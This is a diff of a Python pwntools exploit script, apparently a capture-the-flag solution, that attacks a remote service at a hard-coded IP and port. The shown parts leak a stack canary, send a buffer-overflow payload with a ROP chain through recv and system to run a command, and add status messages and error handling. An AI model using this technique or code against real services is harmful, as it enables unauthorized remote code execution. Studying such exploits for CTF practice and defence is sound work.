@@ -1,9 +1,9 @@
 from pwn import *
 
-#GADGET
+#ADDRESS
 send_plt = p32(0x08048700)
 recv_plt = p32(0x080486e0)
-writable = p32(0x0804b080) # data
+writable = p32(0x0804b080) #DATA_ADDRESS
 send_got = p32(0x0804b064)
 system_plt = p32(0x08048620)
 ppppr= p32(0x08048eec)
@@ -28,8 +28,6 @@ def leak_canary():
 		
 def exploit(canary):
 	s = remote('110.10.212.130',8888)
-
-	print len(cmd)
 	
 	s.recvuntil('> ')
 	s.sendline('1')
@@ -38,25 +36,27 @@ def exploit(canary):
 	payload = 'A' * 40 + p32(canary) + 'A' * 12
 	payload += recv_plt + ppppr + p32(4) + writable + p32(len(cmd)) + p32(0)
 	payload += system_plt + "DDDD" + writable + "\x00\x00\x00\x00"
-
 	s.send(payload)
-	print len(payload)
+	print '[+] PAYLOAD LEN : ' + str(len(payload))
 
 	s.recvuntil('> ')
 	s.sendline('3')
-
 	sleep(0.03)
 	s.send(cmd)
-
-	sleep(10)
+	
+	print '[+] SEND PAYLOAD'	
+	
+	print '[+] Wait 3 SECOND'
+	sleep(3)
 	s.close()
-def main():
-	canary = leak_canary()
-	
-	print 'LEAK_CANARY : %x' % canary
-	
-	exploit(canary)
 
+def main():
+	try:
+		canary = leak_canary()	
+		print '[+] LEAK_CANARY : ' + str(hex(canary))
+		exploit(canary)
+	except:
+		print '[-] ERROR'
 
 if __name__ == '__main__':
 	main()
